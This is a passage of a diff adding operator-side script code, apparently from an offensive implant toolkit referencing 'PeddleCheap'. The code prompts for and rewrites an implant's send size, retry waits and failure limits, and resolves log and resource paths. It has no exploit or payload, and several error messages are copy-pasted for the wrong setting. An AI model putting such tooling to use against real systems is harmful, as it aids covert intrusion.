+		@record off;
+		$localFile = $newFile;
+	}
+	
+	ifnot (prompt "Do you want to keep the normal Maximum Data Send size?") {
+		int $newValue = GetInput("Enter the new Maximum Data Send size");
+		@record on;
+		ifnot (`script PeddleCheap\\ChangeMaxDataSend.eps $localFile $newValue`) {
+			echo "Failed to change max data size";
+			return false;
+		}
+		string $newFile = GetCmdData("file");
+		ifnot (defined($newFile)) {
+		    echo "Failed to get new file's name";
+		    return false;
+		}
+		@record off;
+		$localFile = $newFile;
+	}
+	ifnot (prompt "Do you want to keep the normal Wait Time After Failure?") {
+		int $newValue = GetInput("Enter the new Wait Time After Failure (in seconds)");
+		@record on;
+		ifnot (`script PeddleCheap\\ChangeWaitTimeAfterFailure.eps $localFile $newValue`) {
+			echo "Failed to change max data size";
+			return false;
+		}
+		string $newFile = GetCmdData("file");
+		ifnot (defined($newFile)) {
+		    echo "Failed to get new file's name";
+		    return false;
+		}
+		@record off;
+		$localFile = $newFile;
+	}
+	ifnot (prompt "Do you want to keep the normal Wait Time Between Sends?") {
+		int $newValue = GetInput("Enter the new Wait Time Between Sends (in seconds)");
+		@record on;
+		ifnot (`script PeddleCheap\\ChangeWaitTimeBetweenSends.eps $localFile $newValue`) {
+			echo "Failed to change max data size";
+			return false;
+		}
+		string $newFile = GetCmdData("file");
+		ifnot (defined($newFile)) {
+		    echo "Failed to get new file's name";
+		    return false;
+		}
+		@record off;
+		$localFile = $newFile;
+	}
+	ifnot (prompt "Do you want to keep the normal Maximum Send Failures?") {
+		int $newValue = GetInput("Enter the new Maximum Sends Failures");
+		@record on;
+		ifnot (`script PeddleCheap\\ChangeMaxSendFailures.eps $localFile $newValue`) {
+			echo "Failed to change max data size";
+			return false;
+		}
+		string $newFile = GetCmdData("file");
+		ifnot (defined($newFile)) {
+		    echo "Failed to get new file's name";
+		    return false;
+		}
+		@record off;
+		$localFile = $newFile;
+	}
+
+    return true;
+
+}
+# END ChangeProxy
+
+#-----------------------------------------------------------------------
+sub GetFullLogPath(IN string $relativePath, OUT string $fullPath)
+{
+
+    @echo off;
+
+    # see if it's already a full path
+    string $parts = SplitPath($relativePath);
+
+    @record on;
+    ifnot (`getdirectory -logs`) {
+	echo "* Failed to get logs directory";
+	return false;
+    }
+    @record off;
+
+    string $logDir = GetCmdData("dir");
+    ifnot (defined($logDir)) {
+	echo "* Unable to retrieve logs directory";
+	return false;
+    }
+
+    $fullPath = "$logDir\\$parts[1]";
+    return true;
+
+}
+# END GetFullLogPath
+
+#-----------------------------------------------------------------------
+sub GetFullResourcePath(IN string $relativePath, OUT string $fullPath)
+{
+
+    @echo off;
+
+    # see if it's already a full path
+    string $parts = Split(":", $relativePath);
+    if (sizeof($parts) > 1) {
+
+	# path is a full path
+	$fullPath = $relativePath;
+
+    } else {
+
+	# path is not a full path
+	@record on;
+	ifnot (`getdirectory -resources`) {
+	    echo "* Failed to get resources directory";
+	    return false;
+	}
+	@record off;
+
+	string $resDir = GetCmdData("dir");
+	ifnot (defined($resDir)) {
+	    echo "* Unable to retrieve resources directory";
+	    return false;
+	}
+
+	$fullPath = "$resDir\\$relativePath";
+
+    }
+
+    return true;
+
+}
+# END GetFullResourcePath
